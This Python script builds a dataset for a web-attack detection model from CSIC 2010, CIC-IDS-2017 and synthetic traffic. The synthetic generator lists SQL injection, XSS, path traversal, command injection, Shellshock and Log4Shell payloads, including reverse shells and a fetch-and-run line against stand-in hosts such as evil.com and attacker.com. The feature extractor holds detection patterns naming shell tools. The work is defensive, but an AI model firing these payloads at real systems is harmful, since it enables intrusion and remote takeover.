import os
import re
import json
import numpy as np
import pandas as pd
from collections import Counter
from imblearn.over_sampling import SMOTE

os.makedirs("data/raw", exist_ok=True)
os.makedirs("data/processed", exist_ok=True)
os.makedirs("models", exist_ok=True)
os.makedirs("logs", exist_ok=True)

print("=" * 65)
print("Merged Dataset Preparation Pipeline")
print("=" * 65)



#S1: CSIC 2010 Parser
def parse_csic_file(filepath: str, label: str) -> list:
    """Parse raw CSIC 2010 HTTP request blocks."""
    records = []
    if not os.path.exists(filepath):
        return records
    with open(filepath, "r", errors="ignore") as f:
        raw = f.read()
    for block in raw.strip().split("\n\n"):
        lines = block.strip().split("\n")
        if not lines or not lines[0].startswith(("GET", "POST", "PUT", "DELETE")):
            continue
        first = lines[0].split()
        record = {
            "method":   first[0] if len(first) > 0 else "GET",
            "url":      first[1] if len(first) > 1 else "/",
            "body":     "",
            "user_agent": "",
            "label":    label,
            "is_malicious": 0 if label == "normal" else 1,
            "source":   "csic",
        }
        in_body = False
        for line in lines[1:]:
            if line == "":
                in_body = True
            elif in_body:
                record["body"] += line
            elif line.lower().startswith("user-agent:"):
                record["user_agent"] = line.split(":", 1)[1].strip()
        records.append(record)
    return records





#S2: CIC-IDS-2017 Loader
def load_cic_ids(filepath: str, sample_size: int = 5000) -> pd.DataFrame:
    """
    Load CIC-IDS-2017 CSV and convert network flows into
    pseudo-HTTP representations so they share the same feature space.
    """
    if not os.path.exists(filepath):
        # Try to find any CSV in data/cic_ids/
        folder = "data/cic_ids"
        csvs = [os.path.join(folder, f) for f in os.listdir(folder)
                if f.endswith(".csv")] if os.path.exists(folder) else []
        if not csvs:
            print("       CIC-IDS not found — skipping (add CSVs to data/cic_ids/)")
            return pd.DataFrame()
        filepath = csvs[0]
        print(f"       CIC-IDS: using {filepath}")

    df = pd.read_csv(filepath, low_memory=False)
    df.columns = df.columns.str.strip()  # remove whitespace from header
    df = df.sample(min(sample_size, len(df)), random_state=42)

    label_col = next((c for c in df.columns if "label" in c.lower()), None)
    records = []
    for _, row in df.iterrows():
        label_val = str(row.get(label_col, "BENIGN")).strip().upper() if label_col else "BENIGN"
        is_mal = 0 if label_val == "BENIGN" else 1

        # Build pseudo-HTTP payload from network flow features
        fwd = row.get("Total Length of Fwd Packets", row.get("TotLen Fwd Pkts", 0))
        bwd = row.get("Total Length of Bwd Packets", row.get("TotLen Bwd Pkts", 0))
        dur = row.get("Flow Duration", 0)
        proto = row.get("Protocol", 6)

        body = (f"src_bytes={fwd}&dst_bytes={bwd}"
                f"&flow_duration={dur}&protocol={proto}")

        records.append({
            "method": "GET",
            "url": "/network_flow",
            "body": body,
            "user_agent": "cic-flow/1.0",
            "label": "normal" if is_mal == 0 else "attack",
            "is_malicious": is_mal,
            "source": "cic_ids",
        })
    return pd.DataFrame(records)





#S3 - Synthetic Generator
def generate_synthetic_dataset(n_normal: int = 3000, seed: int = 42) -> pd.DataFrame:
    """
    Generate synthetic HTTP traffic covering obfuscated variants,
    zero-day-style payloads and realistic benign browsing.
    """
    rng = np.random.default_rng(seed)

    #Normal
    normal_urls = [
        "/index.php?id={}", "/shop?cat={}&page={}", "/user/profile?uid={}",
        "/search?q=python+tutorial", "/api/products?limit=10&offset={}",
        "/blog/post/{}", "/login", "/register", "/about", "/contact",
        "/api/v1/users/{}", "/dashboard?view=stats",
    ]
    normal_bodies = [
        "username=alice&password=securepass123",
        "email=user@example.com&name=John",
        "product_id={}&qty=2", "comment=Great!&rating=5",
        "page=1&limit=20&sort=price_asc", "",
    ]

    #SQL Injection (including obfuscated)
    sqli_payloads = [
        "' OR '1'='1", "admin'--", "1' UNION SELECT NULL--",
        "' OR 1=1--", "1'; DROP TABLE users--",
        "1' AND SLEEP(5)--", "1' UNION SELECT username,password FROM users--",
        # Obfuscated variants (evasion techniques)
        "UN/**/ION SE/**/LECT", "1' /*!UNION*/ /*!SELECT*/ NULL--",
        "%27%20OR%20%271%27%3D%271",  # URL encoded
        "1' OR 'unusual'='unusual",
        "';EXEC(0x73656c65637420404076657273696f6e)--",  # hex encoded
        "1' OR 1=1 LIMIT 1 OFFSET 0--",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]

    #XSS (standard + encoded variants)
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "javascript:alert(document.cookie)",
        "<ScRiPt>alert('XSS')</ScRiPt>",           # case obfuscation
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",     # URL encoded
        "<svg/onload=alert('XSS')>",
        "';alert(String.fromCharCode(88,83,83))//",  # charcode evasion
        "<details/open/ontoggle=alert(1)>",          # uncommon tag
        "<body onload=alert('XSS')>",
    ]

    #Path Traversal
    path_payloads = [
        "../../etc/passwd", "..\\..\\windows\\system32\\cmd.exe",
        "....//....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "/var/www/html/../../../etc/shadow",
        "../../../../boot.ini",
        "..%252f..%252f..%252fetc%252fpasswd",       # double encoding
    ]

    #Command Injection
    cmd_payloads = [
        "; ls -la", "| cat /etc/passwd", "&& whoami",
        "`id`", "$(whoami)", "; wget http://evil.com/shell.sh | bash",
        "& net user", "| nc attacker.com 4444 -e /bin/bash",
        "; python3 -c 'import socket,subprocess,os'",
    ]

    #Header / Shellshock / Log4Shell
    header_payloads = [
        "() { :; }; echo; /bin/bash -c 'id'",
        "() { ignored; }; /bin/bash -i >& /dev/tcp/192.168.1.1/4444",
        "${jndi:ldap://attacker.com/exploit}",
        "${${lower:j}ndi:${lower:l}dap://evil.com/x}",  # obfuscated log4shell
    ]

    records = []

    #Normal traffic
    for i in range(n_normal):
        url = rng.choice(normal_urls).format(*[rng.integers(1, 500) for _ in range(3)])
        body = rng.choice(normal_bodies).format(*[rng.integers(1, 200) for _ in range(2)])
        records.append({
            "method": rng.choice(["GET", "POST"], p=[0.6, 0.4]),
            "url": url, "body": body,
            "user_agent": rng.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (X11; Linux x86_64)",
                "curl/7.68.0", "python-requests/2.28.0",
            ]),
            "label": "normal", "is_malicious": 0, "source": "synthetic",
        })

    #Attack traffic
    for payloads, label, n in [
        (sqli_payloads,   "sqli",         280),
        (xss_payloads,    "xss",          220),
        (path_payloads,   "path_traversal", 160),
        (cmd_payloads,    "cmd_injection", 160),
        (header_payloads, "header_attack", 120),
    ]:
        for _ in range(n):
            payload = rng.choice(payloads)
            method = rng.choice(["GET", "POST"])
            url = f"/search?q={payload}" if method == "GET" else rng.choice(["/login", "/api/data"])
            body = "" if method == "GET" else f"input={payload}&submit=1"
            records.append({
                "method": method, "url": url, "body": body,
                "user_agent": rng.choice([
                    "Mozilla/5.0", "sqlmap/1.7", "Nikto/2.1.6",
                ]),
                "label": label, "is_malicious": 1, "source": "synthetic",
            })

    return pd.DataFrame(records).sample(frac=1, random_state=seed).reset_index(drop=True)







#Feature Engineering (47 features)

def calculate_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = Counter(s)
    total = len(s)
    return -sum((c / total) * np.log2(c / total) for c in counts.values())


def extract_features(row: dict) -> dict:
    url  = str(row.get("url", ""))
    body = str(row.get("body", ""))
    method = str(row.get("method", "GET"))
    ua   = str(row.get("user_agent", ""))
    payload = url + " " + body
    pl = payload.lower()

    f = {}

    #Lexical
    f["url_length"]      = len(url)
    f["body_length"]     = len(body)
    f["payload_length"]  = len(payload)
    f["num_params"]      = url.count("=")

    #Special characters
    f["count_single_quote"]   = payload.count("'")
    f["count_double_quote"]   = payload.count('"')
    f["count_semicolon"]      = payload.count(";")
    f["count_lt"]             = payload.count("<")
    f["count_gt"]             = payload.count(">")
    f["count_pipe"]           = payload.count("|")
    f["count_ampersand"]      = payload.count("&")
    f["count_dot"]            = payload.count(".")
    f["count_slash"]          = payload.count("/")
    f["count_backslash"]      = payload.count("\\")
    f["count_special"]        = len(re.findall(r"[^a-zA-Z0-9\s]", payload))
    f["ratio_special"]        = f["count_special"] / max(len(payload), 1)
    f["ratio_alpha"]          = sum(c.isalpha() for c in payload) / max(len(payload), 1)
    f["ratio_digit"]          = sum(c.isdigit() for c in payload) / max(len(payload), 1)

    #SQL Injection
    sql_kw = (r"\b(union|select|insert|update|delete|drop|create|alter|exec|execute|"
              r"cast|convert|declare|table|from|where|having|order|group|sleep|"
              r"benchmark|load_file|null|or|and|not)\b")
    f["sql_keyword_count"]    = len(re.findall(sql_kw, pl))
    f["has_sql_comment"]      = int(bool(re.search(r"(--|\/\*|\*\/|#)", payload)))
    f["has_tautology"]        = int(bool(re.search(r"(\"|\')?\s*(or|and)\s+\d+=\d+", pl)))
    f["has_union_select"]     = int(bool(re.search(r"union.{0,20}select", pl)))
    f["has_sleep"]            = int(bool(re.search(r"sleep\s*\(\d+\)|benchmark\s*\(", pl)))
    f["has_hex_string"]       = int(bool(re.search(r"0x[0-9a-f]{4,}", pl)))

    #XSS
    f["has_script_tag"]       = int("<script" in pl)
    f["has_html_event"]       = int(bool(re.search(r"on\w+\s*=", pl)))
    f["has_javascript_proto"] = int("javascript:" in pl)
    f["has_iframe"]           = int("<iframe" in pl)
    f["has_onerror"]          = int("onerror" in pl or "onload" in pl)
    f["html_tag_count"]       = len(re.findall(r"<[^>]+>", payload))

    #Path Traversal
    f["has_path_traversal"]   = int(bool(re.search(r"\.\.[/\\]", payload)))
    f["dotdot_count"]         = payload.count("..")
    f["has_etc_passwd"]       = int("etc/passwd" in pl)
    f["has_win_system"]       = int("windows" in pl and "system32" in pl)
    f["pct_encoded_traversal"]= int(bool(re.search(r"%2e%2e[%2f5c]", pl)))
    f["double_encoded"]       = int(bool(re.search(r"%25[2-9][0-9a-f]", pl)))  # NEW

    #Command Injection
    f["has_cmd_separator"]    = int(bool(re.search(r"[;|&`$()]", payload)))
    f["has_shell_cmd"]        = int(bool(re.search(
        r"\b(cat|ls|id|whoami|wget|curl|nc|bash|sh|cmd|powershell|python|perl)\b", pl)))
    f["has_backtick"]         = int("`" in payload)
    f["has_dollar_paren"]     = int("$(" in payload)

    #Header Attacks
    f["has_shellshock"]       = int("() {" in payload or "(){" in payload)
    f["has_jndi"]             = int("jndi:" in pl)

    #Obfuscation / Encoding
    f["pct_encoded_chars"]    = len(re.findall(r"%[0-9a-fA-F]{2}", payload))
    f["hex_sequences"]        = len(re.findall(r"0x[0-9a-fA-F]+", pl))
    f["entropy"]              = calculate_entropy(payload)
    f["url_entropy"]          = calculate_entropy(url)

    #HTTP metadata
    f["is_post"]              = int(method.upper() == "POST")
    f["is_get"]               = int(method.upper() == "GET")
    f["has_scanner_ua"]       = int(bool(re.search(
        r"(sqlmap|nikto|nmap|masscan|dirbuster|gobuster|burp|zap|nessus)", ua.lower())))

    return f



#Main Pipeline
print("\n Loading data sources")

#CSIC 2010
csic_records = []
for fname, lbl in [
    ("data/raw/normalTrafficTraining.txt", "normal"),
    ("data/raw/normalTrafficTest.txt",     "normal"),
    ("data/raw/anomalousTrafficTest.txt",  "attack"),
]:
    parsed = parse_csic_file(fname, lbl)
    if parsed:
        print(f"       CSIC  → {len(parsed):>5,} records  ({fname})")
    csic_records.extend(parsed)
df_csic = pd.DataFrame(csic_records) if csic_records else pd.DataFrame()

#CIC IDS 2017
df_cic = load_cic_ids("data/cic_ids/MachineLearningCSV.csv", sample_size=5000)
if len(df_cic):
    print(f"       CIC   → {len(df_cic):>5,} records (network flows)")

#Synthetic
df_synthetic = generate_synthetic_dataset(n_normal=3000)
print(f"       Synth → {len(df_synthetic):>5,} records (augmented)")

#Merge
dfs = [d for d in [df_csic, df_synthetic, df_cic] if len(d)]
df_raw = pd.concat(dfs, ignore_index=True)
df_raw["is_malicious"] = (df_raw["label"] != "normal").astype(int)
print(f"\n       MERGED total: {len(df_raw):,}")
print(f"       Normal: {(df_raw['is_malicious']==0).sum():,}  |  Malicious: {(df_raw['is_malicious']==1).sum():,}")

#Cap class dominance before SMOTE (prevents CIC from flooding)
print("\n Capping class dominance (max 5k per class)")
df_raw = (df_raw
          .groupby("is_malicious", group_keys=False)
          .apply(lambda x: x.sample(min(len(x), 5000), random_state=42))
          .reset_index(drop=True))
print(f"       After cap: {len(df_raw):,} rows")

print("\n Extracting features")
feature_records = []
for _, row in df_raw.iterrows():
    feats = extract_features(row.to_dict())
    feats["is_malicious"] = row["is_malicious"]
    feats["label"]        = row.get("label", "unknown")
    feature_records.append(feats)

df_features = pd.DataFrame(feature_records)
feature_cols = [c for c in df_features.columns if c not in ["is_malicious", "label"]]
print(f"       {len(feature_cols)} features extracted")

print("\n SMOTE balancing")
X = df_features[feature_cols].fillna(0)
y = df_features["is_malicious"]
print(f"       Before → Normal: {(y==0).sum():,}  |  Malicious: {(y==1).sum():,}")
smote = SMOTE(random_state=42, k_neighbors=5)
X_bal, y_bal = smote.fit_resample(X, y)
print(f"       After  → Normal: {(y_bal==0).sum():,}  |  Malicious: {(y_bal==1).sum():,}")

df_balanced = pd.DataFrame(X_bal, columns=feature_cols)
df_balanced["is_malicious"] = y_bal
# Also keep multi-class label (attack type) for classification model
df_features.to_csv("data/processed/features_raw.csv", index=False)
df_balanced.to_csv("data/processed/features_balanced.csv", index=False)

print("\n Saving artifacts")
with open("models/feature_columns.json", "w") as f:
    json.dump(feature_cols, f, indent=2)

print(f"\n{'='*65}")
print("Done!")
print(f"  Features:          {len(feature_cols)}")
print(f"  Balanced samples:  {len(df_balanced):,}")
print(f"  Saved to:          data/processed/")
print(f"{'='*65}")